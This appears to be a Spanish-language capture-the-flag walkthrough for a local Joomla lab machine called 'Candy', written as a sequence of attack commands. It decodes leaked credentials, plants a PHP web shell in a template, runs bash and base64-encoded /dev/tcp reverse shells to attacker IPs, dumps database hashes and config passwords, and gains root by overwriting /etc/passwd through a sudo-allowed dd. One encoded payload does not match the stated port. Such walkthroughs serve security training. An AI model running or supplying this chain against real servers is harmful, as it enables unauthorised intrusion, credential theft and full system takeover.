- Tags: #Candy
---
[Maquina Candy](https://mega.nz/file/WJVEnTAK#ognGlnVkavgOovj1D_AhGfQOL2ij4rsgL0Q0ueWy8vc) ==> Enlace al laboratorio.
```bash
7z x candy.zip # Descomprimimos el archivo
sudo bash auto_deploy.sh candy.tar # Desplegamos el laboratorio
```

#### Fase Reconocimiento:
```bash
172.17.0.2 # --> Direccion IP del target
ping -c 1 172.17.0.2 # Lanzamos una traza ICMP para determinar si tenemos conectividad con el target

wichSystem.py 172.17.0.2 # Determinamos que estamos ante una maquina linux
172.17.0.2 (ttl -> 64): Linux
```

#### Fase Reconocimiento Puertos:
```bash
nmap -p- -sS --open --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts # Realizamos descubrimiento de puertos
extractPorts allPorts # Parseamos la informacion mas relevante del primer escaneo.
nmap -sC -sV -p80 172.17.0.2 -oN targeted # Realizamos un escaneo exhaustivo para determinar el servicio y la version que corren detras de estos puertos.
```

#### Fase Reconocimiento Web:
**( 80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu)) )** ==> Tenemos un servico web, Desplegado con un gestor de contenido **Joomla** 
```bash
 gobuster dir -u http://172.17.0.2/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 --add-slash -o directoryJoomla  # Fuzzeamos por directorios
```

**( http://172.17.0.2/index.php )** ==> Tenemos la web principal
**( http://172.17.0.2/administrator/ )** ==> Tenemos un panel de administracion, Con un posible usuario filtrado, **( luisillo )**

```bash
wfuzz -c --hw 364 -t 200 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -u "http://172.17.0.2/index.php?FUZZ=test" # Fuzzeamos por posibles parametros
# ( tmpl ) -> Tenemos un parametro valido
# ( %co ) -> Tenemos otro parametro valido
```

**Nota** ==> Usamos la herramienta **( joomscan )** para realizar un escaneo exhaustivo a le gestor de contenido **CMSJoomla** que nos reporta lo siguiente critico:
```bash
[+] Checking robots.txt existing, [++] robots.txt is found
path : http://172.17.0.2/robots.txt # En esta encontramos las mismas credenciales filtradas, en base64

http://172.17.0.2/un_caramelo # Tenemos Una ruta potencial
```

**( admin:c2FubHVpczEyMzQ1 )** ==> Estas con las credenciales filtradas a la cual decodificaremos para obtenerla en texto plano.

```bash
echo -n "c2FubHVpczEyMzQ1" | base64 -d
sanluis12345 # Credencial en texto plano
```

#### Fase Intrusion:
```bash
username: admin
password: sanluis12345
```

Ahora estamos conectados buscaremos la manera de aconteser un fallo de seguridad.
**( System > Side Templates > Template > Index.php )** ==> Estando desde el panel de administracion, ingresamos a esta ruta para modificar el **index.php** inyectando esta instruccion en el archivo para poder cargar una instruccion a nivel de sistema que nos permita tomar acceso al servidor.
```bash
<?php system($_GET['cmd']) ?>
```

Una ves guardado el archivo procedemos a intentar carga comandos en la maquina"
```bash
view-source:http://172.17.0.2/?shadow=whoami # Logramos ejecutar comandos.
```

#### Fase Intrusion:
```bash
nc -nlvp 443
```

```bash
/?shadow=bash+-c+'exec+bash+-i+%26>/dev/tcp/192.168.100.22/443+<%261' # Ejecutamos el siguiente onLiner para tomar acceso desde burpsuite con la peticion interceptada.
```

#### Fase Escalada Privilegios:
**( www-data )** ==> Estamos logueados como este usuario tendremos que ver como elevar privilegios

```bash
# Tenemos credenciales para un usuario en la base de datos que podemos intentar ver.
public $dbtype = 'mysqli';
public $host = 'localhost';
public $user = 'joomla_user';
public $password = 'luisillo123456';
public $db = 'joomla_db';

mysql -u joomla_user -p # despues proporcionamos la password
```

```bash
select username, password from umo54_users; # Filtramos por usuarios
admin    | $2y$10$f/d0sy442VzLXyaUhSmmOu.FBRYed2afncJFmYkuJwRwsJQoaGYbW # Tenemos un hash que tendremos que aplicar fuerza bruta.
```

**Nota** ==> Luego, crearemos una reverse shell y la convertiremos a Base64 usando el siguiente comando:
`echo "sh -i >& /dev/tcp/172.16.1.131/443 0>&1" | base64`

Esto generará una cadena en Base64 como la siguiente:
`c2ggLWkgPiYgL2Rldi90Y3AvMTcyLjE2LjEuMTMxLzQ0NDQgMD4mMQo=`

Ahora, inyectaremos esta cadena en el parámetro `shadow` de la siguiente manera:
`http://172.17.0.2/?shadow=echo%20c2ggLWkgPiYgL2Rldi90Y3AvMTcyLjE2LjEuMTMxLzQ0NDQgMD4mMQo= | base64 -d | bash`

Esto decodificará la reverse shell y la ejecutará en el servidor, estableciendo una conexión con nuestra máquina atacante en la IP `172.16.1.131` y el puerto `443`.

Buscaremos por archivos **.txt**
```bash
find / -type f -iname "*.txt" 2>/dev/null # Filtramos por los que acaben en txt
/var/backups/hidden/otro_caramelo.txt # Encontramos este
```

Ahora tenemos nuevas credenciales de acceso, Pero las usaremos para migrar al usaurio **luisillo**
```bash
// Información sensible
$db_host = 'localhost';
$db_user = 'luisillo';
$db_pass = 'luisillosuperpassword';
$db_name = 'joomla_db';
```

**( su luisillo )** ==> Despues proporcionamos la password: **( luisillosuperpassword )**

```bash
sudo -l
User luisillo may run the following commands on 799f3d7967f3:
    (ALL) NOPASSWD: /bin/dd # Tenemos una via potencial de sobreescribir el archivo /etc/passwd
```

#### Explitacion
```bash
cat /etc/passwd > passwdBackup
openssl passwd # Ejecutamos este para generar una password. que despues inyectaremos en nuestro passwdBackup
$1$ZJslVBID$were/CYIwYa1ex/T1n4.j. # Nos genero esta password

root:$1$ZJslVBID$were/CYIwYa1ex/T1n4.j.:0:0:root:/root:/bin/bash # Modificamos el archivo para que quede asi inyectado nuestra nueva password.
cat passwdBackup  | sudo -u root /bin/dd of=/etc/passwd # Sobreescribimos el archivo.

source .bashrc
su root # Proporcionamos la nueva password que nosotros definimos. y estemos logueados como root.
```